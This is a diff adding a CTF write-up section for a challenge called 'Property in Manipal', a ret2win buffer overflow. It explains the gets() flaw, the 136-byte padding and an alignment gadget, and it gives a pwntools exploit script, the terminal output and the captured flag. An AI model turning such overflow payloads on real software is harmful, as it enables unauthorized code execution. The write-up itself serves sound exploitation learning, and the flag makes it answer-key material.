@@ -161,7 +161,62 @@ This challenge did take a long time as I was out of touch with the tools. Regard
 - https://www.sourceware.org/gdb/documentation/
 ----------------------------------------------------------------------------------------------------------------------------------
 ## Property in Manipal
+This challenge was a classic example of buffer overflow and Ret2Win scenario 
 
+### Solution 
+To solve this challenge, I followed the steps as given below: 
+- I first analyzed the debugged code. I could see straight up that it used `gets()`  which allows us to cause a buffer overflow. The exact line is as below:
+```bash
+gets(local_48);
+```
+- This line is a part of the `vuln()` function, which we found after navigating to the `main()` function.
+- After some trial and error, I found out that the padding needed for this was 136 bytes (128 + 8). The 8 bytes are for the Saved Base Pointer.
+- Apart from this, I also had to set up a gadget to ensure that we do not get the issue of `movaps`. Finally I had to go around looking for the address of `system()` call which allowed us to get the flag straight up.
+- The script for this is as below:
+```bash
+from pwn import *
+
+p = remote('propertyinmanipal.nitephase.live', 42586)
+
+payload = b'A'*136 + p64(0x4010e4) + p64(0x401196)
+log.info("Sending Payload...\n")
+p.send(payload)
+p.interactive()
+```
+- Running this script gave us the output as below:
+```bash
+ ⚙  Sat  6 Dec - 17:37  ~/Downloads/src 
+ @ishaan-mishra  python3 exploit.py
+[+] Opening connection to propertyinmanipal.nitephase.live on port 42586: Done
+[*] Sending payload..
+[*] Switching to interactive mode
+I bought a property in Mandavi
+& what they do for you is,
+they give you the property.
+Enter your name to signup for the property: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\xf6\xdbO\xfc\x7f
+Enter the amount for customizations: $ 
+nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
+
+[*] Got EOF while reading in interactive
+$  [7]  + 13890 suspended (signal)  python3 exploit.py
+
+ ✘ ⚙  Sat  6 Dec - 17:37  ~/Downloads/src 
+ @ishaan-mishra  
+
+```
+### Flag 
+`nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}`
+
+### What I learned
+From this challenge, I learned a lot about gadgets and how they work, what they are. 
+
+### Notes 
+Gadgets are pretty useful and something that will always be available. This is a very important aspect of BinEx, especially when NX is enabled.
+
+### References
+- https://drive.google.com/drive/u/1/folders/1iE7YB0XXwTZoCgdqV4tEBAV0E_Q1-2Y3?ths=true
+- https://r1ru.github.io/categories/binary-exploitation-101
+- https://ctf101.org/binary-exploitation/return-oriented-programming/
 ----------------------------------------------------------------------------------------------------------------------------------
 ## IQ Test
 This challenge was pretty lengthy, because of the multiple flags, and also shifting from simple buffer overflow to Return Oriented Programming.
